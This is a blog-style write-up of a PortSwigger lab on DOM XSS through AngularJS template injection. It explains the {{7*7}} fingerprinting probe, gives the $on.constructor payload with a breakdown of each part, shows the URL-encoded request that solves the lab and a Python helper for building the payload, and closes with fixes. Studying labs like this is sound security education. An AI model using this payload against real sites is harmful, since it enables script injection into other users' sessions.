---
layout: post
title: "PortSwigger: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded"
date: 2026-08-31 09:00:00 -0500
categories: [PortSwigger, Web Security]
tags: [xss, dom-xss, angularjs, csti, client-side-template-injection, cwe-79]
---

## Lab

**PortSwigger Web Security Academy** — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**Difficulty:** Practitioner  
**CWE:** CWE-79 (Cross-Site Scripting)  
**Sub-class:** Client-Side Template Injection (CSTI) via AngularJS

---

## The Vulnerability

The application uses AngularJS (`ng-app` directive) and reflects the `?search=` parameter
inside the Angular template scope. The server HTML-encodes `<`, `>`, and `"` — blocking
standard tag injection. But AngularJS evaluates `{{ }}` template expressions **client-side**,
entirely independently of HTML encoding.

An attacker can inject a valid AngularJS expression that calls arbitrary JavaScript without
using a single angle bracket.

---

## Fingerprinting

Inject `{{7*7}}` in the search box. If the page renders `49`, the input is evaluated as
an AngularJS expression and the page is exploitable.

---

## The Payload

```
{{$on.constructor('alert(1)')()}}
```

| Part | Role |
|------|------|
| `$on` | Always-present AngularJS scope method |
| `.constructor` | JavaScript `Function` constructor |
| `('alert(1)')` | Creates a `Function` with body `alert(1)` |
| `()` | Immediately invokes it |

No `<`, `>`, or `"` required — the filter is irrelevant.

---

## Working Request

```
GET /?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D HTTP/2
Host: <lab-id>.web-security-academy.net
```

AngularJS evaluates the expression client-side → `alert(1)` fires → lab solved.

---

## Shell-Quoting Gotcha

`$on` is a shell variable reference. Passing the payload naively to bash expands it to
empty string (`{{.constructor('alert(1)')()}}` — invalid, no alert). Build the payload
safely in Python:

```python
payload = '{{' + chr(36) + "on.constructor('alert(1)')()" + '}}'
```

---

## Why HTML Encoding Doesn't Help

```
Filter blocks:   <script>alert(1)</script>   →   &lt;script&gt;...
Attacker sends:  {{$on.constructor(...)()}}  →   no < or > needed
```

The server defends against HTML tag injection but AngularJS creates a **second execution
boundary** that runs after the HTML is parsed — completely outside the scope of HTML encoding.

---

## Fix

- Do not reflect untrusted input into an AngularJS `{{ }}` expression context.
- Use `ng-bind` (text-only interpolation) instead of `{{ }}` for user-supplied content.
- Migrate from AngularJS 1.x (reached EOL 2021) to Angular 2+ which removes this vector.
- Apply a Content Security Policy (`script-src 'self'`) to limit script sources.

---

**CWE-79:** [https://cwe.mitre.org/data/definitions/79.html](https://cwe.mitre.org/data/definitions/79.html)
